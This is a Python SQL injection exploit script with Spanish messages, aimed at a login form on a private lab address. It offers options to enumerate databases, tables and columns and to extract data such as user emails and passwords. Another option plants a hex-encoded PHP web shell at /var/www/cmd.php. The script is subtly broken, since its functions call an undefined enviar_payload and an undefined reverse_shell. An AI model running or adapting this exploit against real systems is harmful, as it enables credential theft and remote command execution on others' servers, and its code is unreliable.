import requests
import sys
import re

url = 'http://10.10.10.100/login.php'

cookies = {'PHPSESSID': 'kkrtv0bbfptp5lhn1tgffqdtk5'}

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://10.10.10.100",
    "Referer": "http://10.10.10.100/login.php"
}

def send_payload(payload):
    data = {
        'email': payload,
        'pass': 'test',
        'submit': 'Login',
        'submitted': 'TRUE'
    }
    r = requests.post(url, headers=headers, cookies=cookies, data=data)
    match = re.search(r'Welcome\s+([^<]+)', r.text)
    if match:
        print(match.group(1))
    else:
        return "No se encontro 'Welcome'"

            

def database_enum():
    payload = "' UNION SELECT 1,2,3,group_concat(schema_name),5,6,7,8 FROM information_schema.schemata-- -"
    print("[+] Resultado de bases de datos:")
    return enviar_payload(payload)

def tables_enum(db_name):
    payload = f"' UNION SELECT 1,2,3,group_concat(table_name),5,6,7,8 FROM information_schema.tables WHERE table_schema='{db_name}'-- -"
    print("[+] Resultado tablas:")
    return enviar_payload(payload)

def columns_enum(db_name, table_name):
    payload = f"' UNION SELECT 1,2,3,group_concat(column_name),5,6,7,8 FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}'-- -"
    print("[+] Resultado de columas:")
    return enviar_payload(payload)
    

def data_exfiltration(db_name, table_name, columns_enum):
    payload = f"' UNION SELECT 1,2,3,group_concat({columns_enum}),5,6,7,8 FROM {db_name}.{table_name}-- -"
    print("[+] Resultado:")
    return enviar_payload(payload)

def command_execution():
    payload = "' UNION SELECT 1,2,3,0x3C3F7068702073797374656D28245F4745545B27636D64275D293B203F3E,5,6,7,8 into outfile '/var/www/cmd.php';-- -"
    enviar_payload(payload)
    print("Tu webshell ha sido enviada exitosamente a '/var/www/cmd.php. :)")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("""Uso: python3 SQLinjection.py dbs | --dbs <dbname> tables | --dbs <dbname> --table <table> columns

     Data exfiltration: python3 SQLinjection.py --dbs ch16 --table users --columns email,pass --extract 

     Python3 SQLinjection.py cmd-shell (You know what it is :)""")
        sys.exit(1)

    if sys.argv[1] == "dbs":
        database_enum()

    elif sys.argv[1] == "--dbs" and len(sys.argv) >= 4 and sys.argv[3] == "tables":
        tables_enum(sys.argv[2])

    elif sys.argv[1] == "--dbs" and "--table" in sys.argv and "columns" in sys.argv:
        db_index = sys.argv.index("--dbs") + 1
        table_index = sys.argv.index("--table") + 1
        columns_enum(sys.argv[db_index], sys.argv[table_index])

    elif sys.argv[1] == "--dbs" and "--table" in sys.argv and "--columns" in sys.argv and "--extract" in sys.argv:
        db_index = sys.argv.index("--dbs") + 1
        table_index = sys.argv.index("--table") + 1
        col_index = sys.argv.index("--columns") + 1
        data_exfiltration(sys.argv[db_index], sys.argv[table_index], sys.argv[col_index])


    elif sys.argv[1] == "cmd-shell":
        command_execution()

    elif sys.argv [1] == "reverse-Shell":
        reverse_shell()
    else:
        print("Argumentos invalidos")
